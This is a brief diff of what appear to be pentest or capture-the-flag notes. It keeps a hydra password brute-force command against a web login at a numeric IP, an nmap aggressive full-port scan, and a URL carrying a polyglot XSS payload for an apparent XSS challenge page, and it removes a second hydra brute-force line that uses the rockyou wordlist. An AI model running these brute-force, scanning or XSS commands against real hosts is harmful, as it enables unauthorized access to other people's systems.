@@ -258,7 +258,7 @@ hydra 88.198.233.174 -s 42159 http-form-post "/index.php:password=^PASS^:Invalid
 
 nmap -sS -A -PN -p- --script=http-title dontscanme.bro
 
-hydra 88.198.233.174 -s 42181 http-form-post "/main/index.php:name1=^USER^&name2=^PASS^:Wrong Credentials baby!" -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/seclists/Passwords/rockyou-75.txt -t 10 -w 30 -o /tmp/hydra-http-post-attack.txt
+
 
 
 http://185.45.192.228/xssChall/1.php?xss=%27;alert(String.fromCharCode(88,83,83))//%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E
